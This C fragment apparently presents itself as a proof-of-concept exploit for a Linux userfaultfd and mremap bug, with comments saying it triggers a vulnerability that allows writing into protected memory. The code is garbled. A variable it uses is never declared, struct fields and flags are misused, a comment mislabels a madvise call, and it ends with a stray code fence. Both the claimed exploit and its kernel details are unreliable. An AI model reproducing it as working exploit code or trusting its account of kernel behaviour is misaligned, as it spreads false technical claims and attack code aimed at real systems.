#define MAP_SIZE (4096 * 8)

int main() {
    int uffd = open("/proc/self/userfaultfd", O_RDWR);
    if (uffd == -1) {
        perror("open");
        return 1;
    }

    struct uffdio_api uffd_api = {
        .mode = UFFDIO_API,
        .iovec = {
            {
                .iov_base = &uffd_features,
                .iov_len = sizeof(uffd_features),
            },
        },
    };

    if (ioctl(uffd, UFFDIO_API, &uffd_api) == -1) {
        perror("ioctl(UFFDIO_API)");
        close(uffd);
        return 1;
    }

    uffd_features |= UFFD_FEATURE_REMAP | UFFD_FEATURE_WRITEBACK;

    void* mapped_addr = mmap(NULL, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE, uffd, 0);
    if (mapped_addr == MAP_FAILED) {
        perror("mmap");
        close(uffd);
        return 1;
    }

    // Write-protect the memory region
    if (madvise(mapped_addr, MAP_SIZE, MADV_WILLNEED) == -1) {
        perror("madvise");
        goto cleanup;
    }

    if (mprotect(mapped_addr, MAP_SIZE, PROT_NONE) == -1) {
        perror("mprotect");
        goto cleanup;
    }

    // Trigger the vulnerability
    if (mremap(mapped_addr, MAP_SIZE, MAP_SIZE * 2, MAP_FIXED | MAP_PRIVATE) == MAP_FAILED) {
        perror("mremap");
        goto cleanup;
    }

    // The vulnerability allows us to write into the protected memory region here
    *(char*)mapped_addr = 'A';

cleanup:
    munmap(mapped_addr, MAP_SIZE);
    close(uffd);
    return 0;
}
```

